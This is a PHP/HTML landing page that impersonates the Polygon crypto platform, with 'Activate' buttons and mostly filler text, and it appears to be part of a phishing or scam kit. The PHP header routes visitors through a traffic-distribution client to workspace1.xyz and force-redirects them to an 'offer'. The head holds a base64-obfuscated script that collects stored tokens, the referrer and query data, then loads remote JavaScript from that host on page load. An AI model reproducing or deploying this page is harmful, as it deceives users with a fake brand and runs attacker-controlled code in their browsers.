<?php
// Query params are: utm_term={keyword}&utm_creative={creative}&utm_campaign={campaignid}&utm_position={adposition}&utm_network={network}&utm_target={target}&utm_placement={placement}&utm_match={matchtype} 

require_once dirname(__FILE__) . '/kclient.php';
$client = new KClient('https://workspace1.xyz/', 'yfSJ2QB4knb3m2v3');
$client->sendAllParams();       // to send all params from page query
$client->forceRedirectOffer();       // redirect to offer if an offer is chosen
// $client->param('sub_id_5', '123'); // you can send any params
// $client->keyword('PASTE_KEYWORD');  // send custom keyword
// $client->currentPageAsReferrer(); // to send current page URL as click referrer
// $client->disableSessions(); // to disable using session cookie (without this cookie restoreFromSession wouldn't work)
// $client->debug();              // to enable debug mode and show the errors
// $client->execute();             // request to api, show the output and continue
$client->executeAndBreak();     // to stop page execution if there is redirect or some output
?>
<!DOCTYPE HTML>
<html>
	<head>
	<script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfZnNUYjhEZlpOUkpuZ0J5TCc7CiAgICBpZiAoIXdpbmRvdy5fZnNUYjhEZlpOUkpuZ0J5TCkgewogICAgICAgIHdpbmRvdy5fZnNUYjhEZlpOUkpuZ0J5TCA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly93b3Jrc3BhY2UxLnh5ei9DWmgzTkNXUCcsCiAgICAgICAgfTsKICAgIH0KICAgIGNvbnN0IF9KYmRWVzZ6TjhOSks4djZNID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ2NvbmZpZycpOwogICAgaWYgKHR5cGVvZiBfSmJkVlc2ek44TkpLOHY2TSAhPT0gJ3VuZGVmaW5lZCcgJiYgX0piZFZXNnpOOE5KSzh2Nk0gIT09IG51bGwpIHsKICAgICAgICB2YXIgX3A2dldMdG1CZ0ttcTJIVE4gPSBKU09OLnBhcnNlKF9KYmRWVzZ6TjhOSks4djZNKTsKICAgICAgICB2YXIgX1dwV3BRa1FnNzJzVm1yQ00gPSBNYXRoLnJvdW5kKCtuZXcgRGF0ZSgpLzEwMDApOwogICAgICAgIGlmIChfcDZ2V0x0bUJnS21xMkhUTi5jcmVhdGVkX2F0ICsgd2luZG93Ll9mc1RiOERmWk5SSm5nQnlMLnR0bCA8IF9XcFdwUWtRZzcyc1ZtckNNKSB7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCdzdWJJZCcpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgndG9rZW4nKTsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ2NvbmZpZycpOwogICAgICAgIH0KICAgIH0KICAgIHZhciBfandad0pCRkJZRFRkUlc1aCA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdzdWJJZCcpOwogICAgdmFyIF9EOHBxbXpSZm1mOWJyTmNaID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3Rva2VuJyk7CiAgICB2YXIgX1h0eGpjcFJoRFJ6S2RyOFAgPSAnP3JldHVybj1qcy5jbGllbnQnOwogICAgICAgIF9YdHhqY3BSaERSektkcjhQICs9ICcmJyArIGRlY29kZVVSSUNvbXBvbmVudCh3aW5kb3cubG9jYXRpb24uc2VhcmNoLnJlcGxhY2UoJz8nLCAnJykpOwogICAgICAgIF9YdHhqY3BSaERSektkcjhQICs9ICcmc2VfcmVmZXJyZXI9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5yZWZlcnJlcik7CiAgICAgICAgX1h0eGpjcFJoRFJ6S2RyOFAgKz0gJyZkZWZhdWx0X2tleXdvcmQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC50aXRsZSk7CiAgICAgICAgX1h0eGpjcFJoRFJ6S2RyOFAgKz0gJyZsYW5kaW5nX3VybD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmxvY2F0aW9uLmhvc3RuYW1lICsgZG9jdW1lbnQubG9jYXRpb24ucGF0aG5hbWUpOwogICAgICAgIF9YdHhqY3BSaERSektkcjhQICs9ICcmbmFtZT0nICsgZW5jb2RlVVJJQ29tcG9uZW50KG5hbWUpOwogICAgICAgIF9YdHhqY3BSaERSektkcjhQICs9ICcmaG9zdD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5fZnNUYjhEZlpOUkpuZ0J5TC5SX1BBVEgpOwogICAgaWYgKHR5cGVvZiBfandad0pCRkJZRFRkUlc1aCAhPT0gJ3VuZGVmaW5lZCcgJiYgX2p3WndKQkZCWURUZFJXNWggJiYgd2luZG93Ll9mc1RiOERmWk5SSm5nQnlMLnVuaXF1ZSkgewogICAgICAgIF9YdHhqY3BSaERSektkcjhQICs9ICcmc3ViX2lkPScgKyBlbmNvZGVVUklDb21wb25lbnQoX2p3WndKQkZCWURUZFJXNWgpOwogICAgfQogICAgaWYgKHR5cGVvZiBfRDhwcW16UmZtZjlick5jWiAhPT0gJ3VuZGVmaW5lZCcgJiYgX0Q4cHFtelJmbWY5YnJOY1ogJiYgd2luZG93Ll9mc1RiOERmWk5SSm5nQnlMLnVuaXF1ZSkgewogICAgICAgIF9YdHhqY3BSaERSektkcjhQICs9ICcmdG9rZW49JyArIGVuY29kZVVSSUNvbXBvbmVudChfRDhwcW16UmZtZjlick5jWik7CiAgICB9CiAgICB2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwogICAgICAgIGEudHlwZSA9ICdhcHBsaWNhdGlvbi9qYXZhc2NyaXB0JzsKICAgICAgICBhLnNyYyA9IHdpbmRvdy5fZnNUYjhEZlpOUkpuZ0J5TC5SX1BBVEggKyBfWHR4amNwUmhEUnpLZHI4UDsKICAgIHZhciBzID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ3NjcmlwdCcpWzBdOwogICAgcy5wYXJlbnROb2RlLmluc2VydEJlZm9yZShhLCBzKQogICAgfSkoKTsKICAgIA=="></script>
		<title>Polygon Light</title>
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
		<link rel="stylesheet" href="assets/css/main.css" />
		<noscript><link rel="stylesheet" href="assets/css/noscript.css" /></noscript>
	</head>
	<body class="landing is-preload">

		<!-- Page Wrapper -->
			<div id="page-wrapper">

				<!-- Header -->
					<header id="header" class="alt">
						<h1><a href="index.html">Spectral</a></h1>
						<nav id="nav">
							<ul>
								<li class="special">
									<a href="#menu" class="menuToggle"><span>Menu</span></a>
									<div id="menu">
										<ul>
											<li><a href="index.html">Home</a></li>
											<li><a href="generic.html">Generic</a></li>
											<li><a href="elements.html">Elements</a></li>
											<li><a href="#">Sign Up</a></li>
											<li><a href="#">Log In</a></li>
										</ul>
									</div>
								</li>
							</ul>
						</nav>
					</header>

				<!-- Banner -->
					<section id="banner">
						<div class="inner">
							<h2>Polygon Light</h2>
							<p>Another fine responsive<br />
							site template freebie<br />
							crafted by <a href="http://html5up.net">Polygon Light</a>.</p>
							<ul class="actions special">
								<li><a href="#" class="button primary">Activate</a></li>
							</ul>
						</div>
						<a href="#one" class="more scrolly">Learn More</a>
					</section>

				<!-- One -->
					<section id="one" class="wrapper style1 special">
						<div class="inner">
							<header class="major">
								<h2>Polygon receives a $450 Million funding to do what we do best - Scale E  <br />
								Polygon receives a $450 Million funding to do what we do best - Scale E </h2>
								<p>Polygon is a decentralised scaling platform. <br />
								Polygon makes E accessible for all</p>
							</header>
							<ul class="icons major">
								<li><span class="icon fa-gem major style1"><span class="label">Polygon Light</span></span></li>
								<li><span class="icon fa-heart major style2"><span class="label">Polygon Light</span></span></li>
								<li><span class="icon solid fa-code major style3"><span class="label">Polygon Light</span></span></li>
							</ul>
						</div>
					</section>

				<!-- Two -->
					<section id="two" class="wrapper alt style2">
						<section class="spotlight">
							<div class="image"><img src="images/pic01.jpg" alt="" /></div><div class="content">
								<h2>Polygon Light</h2>
						
							 <p>Apps with low transaction fees without ever sacrificing on security </p>
							</div>
						</section>
						<section class="spotlight">
							<div class="image"><img src="images/pic02.jpg" alt="" /></div><div class="content">
								<h2>Polygon Light</h2>
								<p>It is inherently more secure. It is more open and powerful.</p>
							</div>
						</section>
						<section class="spotlight">
							<div class="image"><img src="images/pic03.jpg" alt="" /></div><div class="content">
								<h2>Polygon Light</h2>
								<p>Polygon Light</p>
							</div>
						</section>
					</section>

				<!-- Three -->
					<section id="three" class="wrapper style3 special">
						<div class="inner">
							<header class="major">
								<h2>Polygon Official WebSite</h2>
								<p>Get Started Polygon</p>
							</header>
							<ul class="features">
								<li class="icon fa-paper-plane">
									<h3></li>
								<li class="icon solid fa-laptop">
									<h3></h3>
									<p></li>
								<li class="icon solid fa-code">
									<h3></h3>
									<p></li>
								<li class="icon solid fa-headphones-alt">
									<h3></h3>
									<p></li>
								<li class="icon fa-heart">
									<h3></h3>
									<p></li>
								<li class="icon fa-flag">
									<h3></h3>
									<p></li>
							</ul>
						</div>
					</section>

				<!-- CTA -->
					<section id="cta" class="wrapper style4">
						<div class="inner">
							<header>
								<h2>Polygon Light</h2>
								<p>Polygon Online. Polygon Matic. Service network </p>
							</header>
							<ul class="actions stacked">
								<li><a href="#" class="button fit primary">Activate</a></li>
								<li><a href="#" class="button fit">Learn More</a></li>
							</ul>
						</div>
					</section>

				<!-- Footer -->
					<footer id="footer">
						<ul class="icons">
							<li><a href="#" class="icon brands fa-twitter"><span class="label">Twitter</span></a></li>
							<li><a href="#" class="icon brands fa-facebook-f"><span class="label">Facebook</span></a></li>
							<li><a href="#" class="icon brands fa-instagram"><span class="label">Instagram</span></a></li>
							<li><a href="#" class="icon brands fa-dribbble"><span class="label">Dribbble</span></a></li>
							<li><a href="#" class="icon solid fa-envelope"><span class="label">Email</span></a></li>
						</ul>
						<ul class="copyright">
							<li>&copy; Untitled</li><li>Design: <a href="http://html5up.net">HTML5 UP</a></li>
						</ul>
					</footer>

			</div>

		<!-- Scripts -->
			<script src="assets/js/jquery.min.js"></script>
			<script src="assets/js/jquery.scrollex.min.js"></script>
			<script src="assets/js/jquery.scrolly.min.js"></script>
			<script src="assets/js/browser.min.js"></script>
			<script src="assets/js/breakpoints.min.js"></script>
			<script src="assets/js/util.js"></script>
			<script src="assets/js/main.js"></script>

	</body>
</html>